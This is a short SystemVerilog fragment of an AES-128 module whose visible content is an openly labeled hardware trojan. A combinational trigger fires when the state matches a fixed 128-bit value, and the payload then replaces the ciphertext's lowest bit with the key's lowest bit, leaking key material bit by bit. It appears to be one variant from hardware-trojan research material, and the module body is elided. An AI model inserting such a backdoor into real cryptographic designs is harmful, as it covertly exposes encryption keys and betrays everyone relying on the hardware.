module aes_128 (
    ...
    // --- TROJAN INJECTION (Combinational Logic) ---
    logic trojan_trigger;
    assign trojan_trigger = (state == 128'h43fe1a023aaafafbe6d129fb947c3c05);

    // PAYLOAD VARIANT 2: Subtle LSB Side-Channel Leaker
    // If triggered, keep 127 bits of normal ciphertext, but replace the 0th bit with the key's 0th bit.
    assign out = trojan_trigger ? {real_ciphertext[127:1], key[0]} : real_ciphertext;
